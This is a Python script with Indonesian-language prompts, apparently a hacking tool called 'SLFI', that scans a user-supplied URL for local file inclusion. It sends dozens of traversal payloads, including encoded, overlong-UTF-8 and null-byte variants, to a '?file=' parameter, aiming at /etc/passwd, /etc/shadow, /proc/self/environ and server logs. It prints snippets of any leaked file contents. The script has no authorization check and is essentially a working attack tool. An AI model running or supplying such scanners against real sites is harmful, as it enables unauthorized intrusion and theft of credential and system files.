import subprocess
import sys

def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

required_packages = ['requests', 'colorama', 'pyfiglet']

for package in required_packages:
    try:
        __import__(package)
    except ImportError:
        print(f"Installing missing package: {package}")
        install(package)

import requests
import re
import time
from colorama import Fore, Style, init
from pyfiglet import figlet_format

init(autoreset=True)

def display_banner():
    print(Fore.MAGENTA + figlet_format("SLFI", font="starwars") + Style.RESET_ALL)
    print(Fore.MAGENTA + "      Made By JustDanz" + Style.RESET_ALL)

display_banner()

base_url = input(Fore.YELLOW + "Masukkan URL target (contoh: http://example.com/page): " + Style.RESET_ALL)

target_url = base_url + "?file="

lfi_payloads = [
    "../../", "../../../", "../../../../", "../../../../../", "../../../../../../",
    "../../../../../../../", "../../../../../../../../",
    "%2e%2e/%2e%2e/", "%2e%2e%2f%2e%2e%2f", "%2e%2e\\%2e%2e\\",
    "..%2f..%2f", "..%c0%af..%c0%af", "..%c1%9c..%c1%9c", 
    "%2e%2e\\%2e%2e\\", "%252e%252e/%252e%252e/"
]

additional_encodings = [
    "", "%00", "%20", "%09"  
]

file_targets = [
    "etc/passwd", "proc/self/environ", "windows/win.ini", "windows/system.ini",
    "boot.ini", "etc/shadow", "proc/version", "etc/issue",
    "var/log/auth.log", "var/log/apache2/access.log", "var/log/httpd/access.log"
]

def check_lfi(url):
    print(Fore.CYAN + f"\nMemeriksa LFI di: {url}" + Style.RESET_ALL)
    headers = {
        "User-Agent": "LFI-Detector/1.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
    }

    sensitive_patterns = {
        "etc/passwd": re.compile(r"root:.*:0:0:"),
        "shadow": re.compile(r"root:[x*]?:[0-9]*:[0-9]*:[0-9]*"),
        "win.ini": re.compile(r"\[fonts\]|\[extensions\]"),
        "system.ini": re.compile(r"\[boot\]|\[drivers\]"),
        "environ": re.compile(r"PATH=.*"),
        "boot.ini": re.compile(r"\[boot loader\]|\[operating systems\]"),
        "version": re.compile(r"Linux version.*"),
        "issue": re.compile(r"Ubuntu|Debian|CentOS|Red Hat"),
        "access.log": re.compile(r"GET|POST|HTTP/1.1")
    }

    for path in lfi_payloads:
        for file in file_targets:
            for encoding in additional_encodings:
                payload = f"{path}{file}{encoding}"
                full_url = url + payload
                print(Fore.GREEN + f"[*] Mencoba payload: {full_url}" + Style.RESET_ALL)
                
                try:
                    start_time = time.time()
                    response = requests.get(full_url, headers=headers, timeout=5)
                    end_time = time.time()
                    
                    if response.status_code == 200:
                        for filename, pattern in sensitive_patterns.items():
                            if filename in file and pattern.search(response.text):
                                print(Fore.RED + f"[+] Potensi LFI ditemukan di: {full_url}" + Style.RESET_ALL)
                                print(Fore.RED + f"    File yang ditemukan: {filename}" + Style.RESET_ALL)
                                print(Fore.RED + f"    Cuplikan isi: {response.text[:500]}..." + Style.RESET_ALL) 
                                return  

                    if end_time - start_time > 3:  
                        print(Fore.YELLOW + f"[+] Kemungkinan LFI berbasis waktu di: {full_url} (response delay)" + Style.RESET_ALL)

                except requests.exceptions.RequestException as e:
                    print(Fore.RED + f"[!] Error saat mengakses: {full_url} | Error: {e}" + Style.RESET_ALL)

    print(Fore.CYAN + "Pemeriksaan selesai. Tidak ditemukan kerentanan LFI." + Style.RESET_ALL)

check_lfi(target_url)
